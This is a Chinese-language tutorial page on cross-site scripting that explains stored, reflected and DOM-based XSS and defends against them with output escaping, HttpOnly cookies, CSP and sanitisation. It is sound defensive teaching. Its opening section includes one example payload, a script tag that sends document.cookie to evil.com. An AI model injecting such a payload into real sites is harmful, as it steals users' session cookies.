---
title: XSS：脚本注入
description: 存储型/反射型/DOM 型三类 XSS：恶意脚本怎么进来的、防在哪个环节
level: basic
core: true
---

## 原理：数据被当成了代码

XSS（跨站脚本攻击）的本质一句话：**攻击者的输入，被浏览器当成
页面自己的 JavaScript 执行了**。脚本一旦在你的站点域内运行，就能
读 Cookie、伪造请求、改 DOM 钓鱼——同源策略对它形同虚设。

```text
评论框输入：<script>fetch('//evil.com?c='+document.cookie)</script>
服务端原样入库 → 任何用户浏览该评论 → 脚本在其浏览器执行 → Cookie 被偷
```

## 三类 XSS，一条时间线

| 类型  | 脚本藏在哪                 | 典型场景                  |
| --- | ---------------------- | --------------------- |
| 存储型 | 持久化数据（评论、昵称、简介）        | 危害最大：每个浏览者都中招        |
| 反射型 | URL 参数，被页面「反射」回显        | 钓鱼链接诱导点击             |
| DOM 型 | 纯前端：`innerHTML` 等插入了不可信数据 | 服务端看不到，代码审计易漏        |

## 防御：输出口是主战场

- **输出转义**（根本手段）：数据回显到 HTML/属性/JS 上下文前，把
  `< > " ' &` 转成实体。关键是**在出口处按上下文转义**，而不是在
  入口全局过滤——同一份数据可能进不同上下文
- **前端框架默认防注入**：React/Vue 文本插值自动转义；但
  `dangerouslySetInnerHTML`、`v-html` 会绕过防线——凡用必审输入源
- **Cookie 加 HttpOnly**：JS 读不到，偷不走登录态（与
  [Cookie/Session](/network/basic/http/04-auth-state/) 的约定配套）
- **CSP 兜底**：Content-Security-Policy 限制脚本只能来自本域，
  即便注入成功也跑不起来
- 输入校验仍有价值（长度、格式白名单），但只当第一道筛子，不当防线

## 要点备忘

- XSS = 输入变代码；三类按「藏身处」划分，防御统一指向输出转义
- 富文本场景用服务端白名单净化（如 DOMPurify），别自己写正则
- HttpOnly + CSP 是纵深：转义漏了它们兜底
- 审计重点搜索：innerHTML、v-html、dangerouslySetInnerHTML、模板
  的三花括号

## 延伸阅读

- [OWASP · XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site-Scripting_Prevention_Cheat_Sheet.html)
